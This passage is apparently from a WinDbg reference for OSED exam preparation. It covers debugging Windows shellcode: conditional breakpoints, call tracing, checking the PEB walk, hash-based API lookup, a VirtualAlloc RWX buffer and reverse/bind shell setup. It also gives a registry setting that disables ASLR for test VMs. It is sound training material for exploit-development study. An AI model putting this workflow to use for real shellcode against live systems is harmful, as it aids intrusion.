[hash loop] name=VirtualAlloc computed=0a4a3a00
```

### Break Only When Iterating Over a Specific Module

In the outer module-walk loop, stop only when `EAX` points to kernel32.dll (base `75a80000`):
```
0:003> bp 01a000b2 ".if (eax == 75a80000) { .echo 'found kernel32'; } .else { gc }"
```

### Break When Stack Value Changes

To catch when a particular slot gets overwritten unexpectedly:
```
0:003> ba w4 ebp-0x20   ← hardware write BP on VirtualAlloc slot
0:003> g

Hardware watchpoint fired
01a00210 8945e0          mov     dword ptr [ebp-20h],eax
0:003> r eax
eax=75ac2340    ← verify this is the correct value
```

### Conditional BP with Register Logging

Log the state of key registers each time `find_function` is entered:
```
0:003> bp 01a000c0 ".printf \"find_function: base=%x hash=%x\\n\", eax, ecx; gc"
```

---

## 15. Logging All CALLs in a Range

### Method 1: `bp addr "r eip; g"` per Known CALL

Place a BP on each `CALL [EBP-N]` instruction and log `EIP` at the time of call:

```
0:003> bp 01a00450 ".printf \"CALL at %x → target=%x\\n\", @eip, poi(ebp-0x20); g"
0:003> bp 01a00480 ".printf \"CALL at %x → target=%x\\n\", @eip, poi(ebp-0x1c); g"
```

### Method 2: `wt` — Watch Trace

`wt` records every function call and return within a traced scope. Set it on entry to the shellcode's main block:

```
0:003> wt -l 3    ← trace 3 levels of call depth

Tracing 01a00000 to return address 00000000
  1    0 [  0] 01a00000
  ...
 12    2 [  1] kernel32!VirtualAlloc
  ...
 45    8 [  2] ntdll!RtlAllocateHeap
  ...
^C   ← press Ctrl+C when done
```

Output shows each function entered, call depth, and instruction counts.

### Method 3: Trace All Calls with `tt` (Trace to Next Call)

Single-step until the next `CALL` instruction:
```
0:003> tt
01a00200 ff55e0          call    dword ptr [ebp-20h]     ← stopped at CALL

0:003> r
...
eip=01a00200

0:003> ln poi(ebp-20)
(75ac2340)   kernel32!VirtualAlloc
```

Repeat `tt` to advance to the next `CALL`.

### Method 4: Log a Block with Script

Use a `.do` loop combined with `tt` to log all calls in a region:
```
0:003> .do { tt; .if (@eip >= 01a00000 && @eip < 01a01000) { .printf "CALL eip=%x target=%x\n", @eip, poi(@esp); } } { @eip < 01a00500 }
```

**Warning:** This can be very slow for code that calls APIs which internally make many sub-calls. Combine with a tight address range filter.

### Method 5: ETW / TTT (Time Travel Trace) for Deep Call Logging

In WinDbg Preview, enable Time Travel Debugging (TTD) before running:
```
File → Start debugging → Configure recording
```
After the recording, replay and search for all calls to a specific target:
```
dx @$cursession.TTD.Calls("kernel32!VirtualAlloc")[0,10]
```

This is the most powerful option for OSED scenarios where you need to understand the full call graph without modifying the shellcode.

---

## Appendix: Quick Reference Card — Shellcode Debug Workflow

```
1. Attach WinDbg to harness process
2. bp kernel32!VirtualAlloc  →  g
3. pt (run to return)  →  r eax  →  note buffer address
4. ba e1 <buffer_addr>  →  g
5. !vprot <buffer_addr>  →  confirm 0x40 (PAGE_EXECUTE_READWRITE)
6. db <buffer_addr> L40  →  confirm bytes copied correctly
7. p through prologue: CLD, CALL/POP EBX, MOV EBP/ESP, SUB ESP
8. p through PEB walk:
   - r eax after fs:[30h]  →  PEB
   - r eax after [eax+0Ch]  →  Ldr
   - r eax after [eax+1Ch]  →  InitOrder flink
   - r eax final  →  kernel32 base; ln eax to confirm
9. p through find_function:
   - bp at hash CMP: .printf name and hash per iteration
   - after CALL: ln eax → confirm correct function
10. dd ebp-0x60 L18  →  verify all slots filled, non-NULL
11. For reverse/bind shell: inspect sockaddr_in before connect/bind
12. bp kernel32!CreateProcessA  →  inspect STARTUPINFOA, verify cb=0x44
13. pt (run to return)  →  r eax  →  1 = success
```

---

*Reference compiled for OSED preparation. All addresses are representative of a 32-bit Windows 10 environment with ASLR disabled. Enable ASLR-off for shellcode testing: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages = 0 (requires reboot; test VMs only).*
